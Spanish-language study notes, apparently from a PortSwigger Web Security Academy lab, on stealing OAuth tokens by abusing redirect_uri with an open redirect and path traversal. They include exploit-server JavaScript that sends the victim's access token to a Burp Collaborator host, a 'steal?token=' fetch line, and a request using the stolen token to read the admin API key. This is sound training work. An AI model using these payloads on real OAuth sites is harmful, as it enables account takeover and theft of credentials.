La cosa es que muchas veces no se va a poder usar un redirect uri que queramos, es por eso que se puede aprovechar un directorio del propio dominio oauth como proxy para comunicar con uno nuestro.

- En el caso de **Authorization Code Grant Type** (response_type=code) :

```HTTP
GET /auth?client_id=c6eqbv0osx6z5432ckccp&redirect_uri=https://0a6a007503054a75808b0357008f00a0.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2
```

Redirige a:

```
https://0a6a007503054a75808b0357008f00a0.web-security-academy.net/oauth-callback?code=maxHfIOqvK0XE9hDBxGBWbRcJ9ilDX4TEC1TLJCZ8kw
```

Podríamos capturar el authorization code de alguna forma, tendríamos que poder leer los parámetros de la url.

- En el caso de **Implicit Grant Type** (response_type=token) :

```HTTP
GET /auth?client_id=l49q2frheseqortcrk5yc&redirect_uri=https://0a0400d00441e2a183de4d65009600ec.web-security-academy.net/oauth-callback&response_type=token&nonce=-420676522&scope=openid%20profile%20email HTTP/2
```

Redirige a :

```
https://0a0400d00441e2a183de4d65009600ec.web-security-academy.net/oauth-callback#access_token=i5NZhEPXz09jnQGsf-23vkxZNt5AX5AIuDmSvzajv5h&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

Con capturar la url a la que redirige valdría, porque ya tendríamos el access token.
Necesitaríamos simplemente reflejar de alguna forma la solicitud de arriba para poder ver el access token.

```javascript
fetch("https://your-server.com/steal?token=" + location.hash);
```

![[Pasted image 20250430232809.png]]

___

Cambiar la redirect_uri nos tira un error.

Necesitamos un open redirect :

```
https://0ad900b3047e517b8239e759003800dc.web-security-academy.net/post/next?path=/post?postId=10
```

```
https://0ad900b3047e517b8239e759003800dc.web-security-academy.net/post/next?path=https://rgb0brh0ccwnti494t7unkc27tdo1f13q.oastify.com
```
```HTTP
HTTP/2 302 Found
Location: https://rgb0brh0ccwnti494t7unkc27tdo1f13q.oastify.com
```


Posible redirect_uri : 
```
https://0ad900b3047e517b8239e759003800dc.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0abc00aa044c51908224e628011900f8.exploit-server.net/exploit
```

Y que el exploit server hostee esto :

```html
<script>
fetch('https://hdyq8heq92tdq81z1j4kka9s4jaey6pue.oastify.com',{
method: "POST",headers: {"Content-Type": "application/x-www-form-urlencoded"},body: location.hash});
</script>
```

De esta forma recibiremos en nuestro burp collaborator el authorizatiion code de la víctima.

Hay que tener en cuenta que para resolver el lab, la victima tendrá que iniciar todo el flujo porque nosotros hacemos que entre en nuestro exploit server , entonces necesitaremos poner ambas cosas en él :


```HTML
<script>
fetch('https://ufd3aug3bfvqsl3c3w6xmnb56wct0jo8.oastify.com',{
method: "POST",headers: {"Content-Type": "application/x-www-form-urlencoded"},body: location.hash});
</script>
```
```HTML
<iframe src='https://oauth-0ad800e2049251f482d1e52c02b000c5.oauth-server.net/auth?client_id=x16bwhu5artq2rhu8uc9t&redirect_uri=https%3a//0ad900b3047e517b8239e759003800dc.web-security-academy.net/oauth-callback/../post/next%3fpath%3dhttps%3a//exploit-0abc00aa044c51908224e628011900f8.exploit-server.net/exploit&response_type=token&nonce=-1828464691&scope=openid%20profile%20email'>
</iframe>
```

El problema de lo anterior es que la víctima entrará en un flujo infinito de redirecciones, mejor hacer los siguiente :

```javascript
<script>
	//Usuario entra por primera vez , es llevado al flujo malicioso de redirecciones con el redirect_uri trucado
    if (!document.location.hash) {
        window.location = 'https://oauth-0ad800e2049251f482d1e52c02b000c5.oauth-server.net/auth?client_id=x16bwhu5artq2rhu8uc9t&redirect_uri=https%3a//0ad900b3047e517b8239e759003800dc.web-security-academy.net/oauth-callback/../post/next%3fpath%3dhttps%3a//exploit-0abc00aa044c51908224e628011900f8.exploit-server.net/exploit&response_type=token&nonce=-1828464691&scope=openid%20profile%20email'
    //Una vez termina el flujo de redirecciones termina en el exploit server de nuevo con el access token en la url detrás de # , nos lo enviamos a nuestro collaborator :
    } else {
        fetch('https://vut4pvv4qgar7midixly1oq6lxrufn3c.oastify.com',{
method: "POST",headers: {"Content-Type": "application/x-www-form-urlencoded"},body: location.hash});
    }
</script>
```


Ahora será simplemente hacer esta solicitud para obtener la API key del admin :

```HTTP
GET /me HTTP/2
Host: oauth-0ad800e2049251f482d1e52c02b000c5.oauth-server.net
Authorization: Bearer gNlKJL0eVsPkes3yKRBkJtuUVfGGUuvMXEY-jzMEcVN
```

```json
{"sub":"administrator","apikey":"AdKVz7ksyenzWo4CxEM9ZYZlKkNUxL0O","name":"Administrator","email":"administrator@normal-user.net","email_verified":true}
```

Otra forma de hacerlo sería con un XSS o HTML injection en vez de con un open redirect :

- **HTML injection vulnerabilities**  
    In cases where you cannot inject JavaScript (for example, due to CSP constraints or strict filtering), you may still be able to use a simple HTML injection to steal authorization codes. If you can point the `redirect_uri` parameter to a page on which you can inject your own HTML content, you might be able to leak the code via the `Referer` header. For example, consider the following `img` element: `<img src="evil-user.net">`. When attempting to fetch this image, some browsers (such as Firefox) will send the full URL in the `Referer` header of the request, including the query string.